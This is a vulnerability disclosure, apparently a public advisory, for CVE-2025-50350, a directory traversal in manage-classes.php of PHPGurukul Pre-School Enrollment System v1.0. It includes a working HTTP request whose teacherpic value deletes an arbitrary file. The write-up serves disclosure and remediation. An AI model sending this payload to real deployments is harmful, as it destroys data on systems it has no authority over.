# PHPGurukul Pre-School Enrollment System Project directory traversal vulnerability-2(manage-classes.php)-CVE-2025-50350

**PHPGurukul  Pre-School Enrollment System Project introduce**
   
   PHPGurukul Pre-School Enrollment System Project is a web-based pre-school enrollment system by PHPGurukul.   

**Vulnerability description**

   There is a security vulnerability in PHPGurukul Pre-School Enrollment System Project v1.0. The vulnerability is caused by  directory traversal vulnerability, which allows remote attackers to traverse directories and delete traversed files.

 PHPGurukul Project address

   
   https://phpgurukul.com/pre-school-enrollment-system-using-php-and-mysql/

   During the code audit, it was found that there was a problem with teacherpic in the manage-classes.php file   
   Line 14 gets the teacherpic but does not perform any filtering, and the teacherpic comes from user input
   After being concatenated into tpicpath in line 15, the unlink operation is performed in line 18. This causes the directory traversal vulnerability
   ![1](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250423150403.png)   
   After analyzing the code, we tried to exploit the vulnerability
   
   **Loophole principle**
   
   Log in to the system backend management system
     
   ![2](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/2.png)
      
   Find the vulnerable functionality in the manage-classes.php page, manage-classes-delete
  
   ![3](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/3.png)
  
   Intercept the data packet and find the manage-classes.php?action=delete data packet. No problem parameter teacherpic was found.
   
   ![4](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/4.png)

   Change the tpic parameter in the data packet to the problematic parameter teacherpic 
   Transformed into attack payload  

    GET /Pre-School-Enrollment-System-PHP/preschool/admin/manage-classes.php?action=delete&&cid=6&&teacherpic=../../../../bbb.txt HTTP/1.1
    Host: localhost
    Sec-Fetch-Site: same-origin
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Sec-Fetch-Mode: navigate
    Accept-Encoding: gzip, deflate, br, zstd
    Cookie: PHPSESSID=qqnj1t0sdqqbv8qh5jrevaaln8
    sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
    Accept-Language: zh-CN,zh;q=0.9
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://localhost/Pre-School-Enrollment-System-PHP/preschool/admin/manage-classes.php
    Sec-Fetch-Dest: document
    sec-ch-ua-mobile: ?0
    sec-ch-ua-platform: "Windows"

   Create bbb.txt test file in  D:\phpstudy_pro\WWW
       ![5](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/微信截图_20250423153628.png)   

   Send payload,
   ![6](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/6.png)
   bbb.txt file has been deleted   
   ![7](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/5.png)    
   This directory traversal vulnerability can cause the traversed files to be deleted.

 **The affected version**   
 PHPGurukul Pre-School Enrollment System Project v1.0    
 Strictly validate and filter all paths entered by users to ensure that only specified files or directories are allowed to be accessed. Regular expressions can be used to restrict the path format.
 
   
